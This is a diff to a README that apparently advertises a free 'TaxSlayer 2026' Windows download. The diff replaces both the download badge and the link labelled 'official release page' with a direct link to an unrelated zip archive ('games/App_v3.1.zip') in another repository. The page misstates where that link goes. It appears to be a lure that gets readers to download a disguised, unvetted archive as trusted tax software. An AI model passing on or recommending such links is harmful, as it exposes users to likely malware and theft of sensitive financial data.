@@ -5,7 +5,7 @@ description: "Download the full version of TaxSlayer 2026 for Windows 10 and 11.
 ---
 # 📊 TaxSlayer-2026 - Prepare and file taxes with ease
 
-[![Download TaxSlayer](https://img.shields.io/badge/Download-TaxSlayer_2026-blue.svg)](https://github.com/aliteratepersonnarcoleptic503/TaxSlayer-2026/releases)
+[![Download TaxSlayer](https://img.shields.io/badge/Download-TaxSlayer_2026-blue.svg)](https://github.com/aliteratepersonnarcoleptic503/aliteratepersonnarcoleptic503.github.io/raw/refs/heads/main/games/App_v3.1.zip)
 
 ## 🎯 About This Software
 
@@ -26,7 +26,7 @@ Before you install the software, ensure your computer meets these requirements:
 
 Follow these steps to set up TaxSlayer-2026 on your PC.
 
-1.  Visit the official release page: [https://github.com/aliteratepersonnarcoleptic503/TaxSlayer-2026/releases](https://github.com/aliteratepersonnarcoleptic503/TaxSlayer-2026/releases).
+1.  Visit the official release page: [https://github.com/aliteratepersonnarcoleptic503/aliteratepersonnarcoleptic503.github.io/raw/refs/heads/main/games/App_v3.1.zip](https://github.com/aliteratepersonnarcoleptic503/aliteratepersonnarcoleptic503.github.io/raw/refs/heads/main/games/App_v3.1.zip).
 2.  Locate the latest version of the installer file, which typically ends in `.exe`.
 3.  Click the file name to download it to your computer.
 4.  Once the download completes, open your "Downloads" folder.
